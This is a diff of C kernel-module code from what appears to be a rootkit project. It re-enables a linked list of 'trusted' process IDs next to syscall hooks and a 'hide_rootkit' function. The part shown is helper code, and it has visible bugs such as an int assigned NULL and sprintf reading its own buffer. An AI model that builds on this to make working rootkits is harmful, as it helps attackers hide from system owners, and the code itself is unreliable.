@@ -6,27 +6,28 @@
 
 extern int BUFFER_SIZE;
 
-/*struct trusted_pid_node_t{
+struct trusted_pid_node_t{
 	int pid;
 	struct trusted_pid_node_t *next;
 };
-struct trusted_pid_node_t *trusted_pid_head;
+struct trusted_pid_node_t* trusted_pid_head;
 
 static int init_trusted_pid_head(void){
-	trusted_pid_head = (struct trusted_pid_node_t *) kmalloc(sizeof(trusted_pid_node_t), GFP_KERNEL);
+	trusted_pid_head = (struct trusted_pid_node_t *) kmalloc(sizeof(struct trusted_pid_node_t), GFP_KERNEL);
 	trusted_pid_head->pid = NULL;
 	trusted_pid_head->next = NULL;
 	return 0;
 }
 
 static int trust_pid(int pid){
-	struct trusted_pid_node_t *current = &trusted_pid_head;
+	int x = 1;
+	struct trusted_pid_node_t *current = trusted_pid_head;
 	if (current->pid==NULL){
 		current->pid = pid;
 		return 0;
 	}
 	while (current->next != NULL) {
-  	current = current->next;
+  	current = (struct trusted_pid_node_t *) current->next;
   }
 	current->next = (struct trusted_pid_node_t *) kmalloc(sizeof(trusted_pid_node_t), GFP_KERNEL);
   current->next->pid = pid;
@@ -35,7 +36,8 @@ static int trust_pid(int pid){
 }
 
 static int untrust_pid(int pid){
-	struct trusted_pid_node_t *current = &trusted_pid_head;
+	int x = 1;
+	struct trusted_pid_node_t *current = trusted_pid_head;
 	if (current->pid==pid){
 		current->pid=NULL;
 		return 0;
@@ -47,34 +49,36 @@ static int untrust_pid(int pid){
 			return 0;
 		}
 		previous = current;
-		current = current->next;
+		current = (struct trusted_pid_node_t *) current->next;
 	}
 	return 0;
 }
 
 static bool check_pid_trusted(int pid){
-	struct trusted_pid_node_t *current = &trusted_pid_head;
+	int x = 1;
+	struct trusted_pid_node_t *current = trusted_pid_head;
 	while(current!=NULL){
 		if (current->pid==pid){
 			return true;
 		}
-		current = current->next;
+		current = (struct trusted_pid_node_t *) current->next;
 	}
 	return false;
 }
 
 static int list_trusted_pids(void){
-	struct trusted_pid_node_t *current = &trusted_pid_head;
+	int x = 1;
+	struct trusted_pid_node_t *current = trusted_pid_head;
 	char buffer[BUFFER_SIZE];
 	sprintf(buffer, "[hooked_syscalls.c::list_trusted_pids] trusted pids: ");
 	while (current != NULL) {
 		sprintf(buffer, "%s %i", buffer, current->pid);
-  	current = current->next;
+  	current = (struct trusted_pid_node_t *) current->next;
   }
 	log_msg(buffer);
 	return 0;
 }
-*/
+
 
 
 static int hide_rootkit(bool hide){
